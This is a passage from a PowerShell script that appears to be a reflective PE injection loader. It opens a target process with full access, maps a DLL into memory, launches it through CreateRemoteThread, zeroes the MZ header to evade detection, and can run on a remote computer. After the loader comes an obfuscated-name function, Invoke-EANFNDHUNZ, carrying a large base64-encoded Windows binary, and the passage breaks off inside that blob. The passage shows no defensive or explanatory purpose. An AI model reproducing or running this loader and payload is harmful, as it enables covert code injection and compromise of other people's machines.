				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-EANFNDHUNZ
{

$PEBytes32 = "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6FZEAACNRcjGRbEAUFdqBmg4AQAAaHACARDoPEQAAIPEUMZFywCNRfhQagJqDWh2AwAAaHACARDoHkQAAI1FpMZF+gBQagZqCmixBAAAaHACARDoA0QAAI1FxMZFqgBQV2oNaEEIAAC/cAIBEFfo6EMAAI1FnMZFxwBQagZqBGjWCAAAV+jRQwAAg8RQxkWiAI1F/MeF2P7//5QRABCJhdD+//8z/41F6MeF5P7//3URABCJhdz+//9HagVZjUXkiY3U/v//iYXo/v//jUXgiYX0/v//jUXcagZaiYUA////jUXYiY3g/v//iY3s/v//x4Xw/v//dxIAEImV+P7//8eF/P7//34QABCJvQT////HhQj///8sEwAQiYUM////jUXUiYUY////jUXQiYUk////jUXMiYUw////jUW0iYU8////jUWsiYVI////jUXIagJZiYVU////jUX4iYVg////jUWkagWJhWz///+NRcSJjRD///+JjRz///9ZagOJhXj///+NRZyJjSj///+JjUD///+JjUz///+JjVj///9ZiUWEjYXQ/v//ahBQVseFFP////ERABDHhSD///80EgAQx4Us////kRAAEImVNP///8eFOP///wMRABDHhUT///8WEQAQx4VQ////VhEAEMeFXP///8MQABCJjWT////HhWj///+wEAAQiY1w////x4V0////ZBIAEImVfP///8dFgGsQABCJTYjHRYwhEgAQ6AhLAAD/dcCL8I2FiP7//1Do36UAAFPoQS0AAIPEGIX2dQczwOlJAwAA6JwJAACjdB8BELtwAgEQjUXsUGoIahBojggAAFPo3kEAADPAZolF9I1FkFBqCGoGaEUDAABT6MVBAAAzwGaJRZiNhcT+//9QagpqD2iGAAAAU+ipQQAAM8BQaiBoYB4BEGaJhc7+///o8EAAAIPESKNsHwEQ6AszAACjcB8BEIXAdQ+NRexQ6HZFAABZo3AfARDoCwMAAKNoHwEQ6CE0AACjeB8BEIXAdQ+NRexQ6E9FAABZo3gfARDocS8AAKN8HwEQhcB1D41F7FDoMkUAAFmjfB8BEOi6MAAAo4AfARCFwHUPjUXsUOgVRQAAWaOAHwEQ6LkxAACjhB8BEIXAdQ+NRexQ6PhEAABZo4QfARDovDQAAIXAjZXE/v//jU2QD0TKUejZRAAA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